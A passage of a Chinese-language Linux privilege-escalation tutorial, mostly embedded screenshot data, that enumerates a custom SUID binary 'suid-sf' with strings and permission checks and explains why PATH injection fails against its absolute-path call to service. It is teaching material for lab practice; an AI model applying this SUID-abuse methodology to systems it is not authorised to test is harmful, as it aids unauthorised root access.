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" width="368" height="44" class="img_ev3q"></p>
<p>运行 <strong>suid-sf</strong> 会执行一些操作，但它不会产生任何输出。</p>
<p>我们可以检查的另一件事是帮助菜单。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/suid-sf --help</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="413" height="44" class="img_ev3q"></p>
<p>结果没有输出任何信息。</p>
<p>接下来，我们将跳过 GTFOBins 检查，因为这是一个不会被列出的自定义二进制文件。</p>
<p>接下来，我们将从二进制文件中提取字符串，以帮助我们确定在执行期间是否正在加载任何其他有趣的二进制文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">strings /usr/bin/suid-sf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629913-626139017-5f3b9fe5f2a3d320e957af83875d0c28.png" width="439" height="447" class="img_ev3q"></p>
<p>Amazing！我们能够发现正在执行的一个有趣的命令，就像上次一样，它正在使用 <strong>service</strong> 二进制文件。</p>
<p>与用于检查 SSH 服务状态的 <strong>suid-path</strong> 二进制文件不同，此二进制文件启动该服务。但此示例与上一个示例之间还有一个主要区别就是：此示例使用了二进制文件的绝对路径。</p>
<p>因为使用的是绝对路径，所以我们将无法像上次那样进行 PATH 注入攻击。</p>
<p>此外，使用绝对路径利用二进制文件的唯一途径是，我们在二进制文件所在目录中拥有写入权限。这样，我们就可以用恶意软件替换二进制文件，类似于我们在 suid-so 示例中的做法。</p>
<p>检查我们是否在 /usr/bin 目录中具有写入权限，结果表明我们没有，这也是预料之中的事。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /usr | grep &quot;bin&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
